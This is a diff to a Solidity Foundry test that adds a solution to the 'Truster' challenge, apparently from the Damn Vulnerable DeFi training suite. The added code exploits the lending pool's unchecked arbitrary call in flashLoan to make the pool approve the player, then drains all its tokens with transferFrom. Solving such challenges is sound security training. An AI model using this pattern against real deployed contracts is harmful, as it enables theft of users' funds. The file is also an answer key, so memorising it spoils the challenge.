@@ -10,7 +10,7 @@ contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant TOKENS_IN_POOL = 1_000_000e18;
 
     DamnValuableToken public token;
@@ -51,7 +51,18 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        // Encode the approve call to allow player to spend all pool tokens
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            player,
+            TOKENS_IN_POOL
+        );
+
+        // Use flash loan to execute the approve call on the token contract
+        pool.flashLoan(0, player, address(token), data);
+
+        // Now transfer all tokens from pool to recovery
+        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
     }
 
     /**
@@ -63,6 +74,10 @@ contract TrusterChallenge is Test {
 
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            TOKENS_IN_POOL,
+            "Not enough tokens in recovery account"
+        );
     }
 }
